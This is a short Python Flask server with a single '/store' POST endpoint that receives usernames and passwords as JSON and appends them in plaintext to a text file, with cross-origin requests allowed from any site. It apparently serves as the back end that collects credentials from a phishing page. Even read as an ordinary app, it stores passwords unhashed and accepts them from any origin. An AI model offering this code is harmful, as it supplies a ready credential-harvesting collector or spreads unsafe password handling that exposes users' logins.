from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  

@app.route('/store', methods=['POST'])
def store_data():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    with open("users.txt", "a") as f:
        f.write(f"{username} : {password}\n")

    return "Data saved successfully!", 200

if __name__ == '__main__':
    app.run()
